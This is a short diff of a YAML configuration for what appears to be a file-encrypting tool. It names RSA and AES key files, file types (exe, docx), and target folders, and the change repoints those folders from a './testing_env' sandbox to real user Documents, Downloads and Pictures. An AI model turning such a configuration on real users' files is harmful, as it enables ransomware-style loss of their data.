@@ -3,9 +3,9 @@ public_key: "file_name" # file to store public key
 private_key: "file_name" # file to store private key
 aes_key: "file_name" # the AES key is encrypted using the private key
 directories:
-  - "./testing_env/Documents"
-  - "./testing_env/Downloads"
-  - "./testing_env/Pictures"
+  - Documents
+  - Downloads
+  - Pictures
 files:
   - exe
   - docx
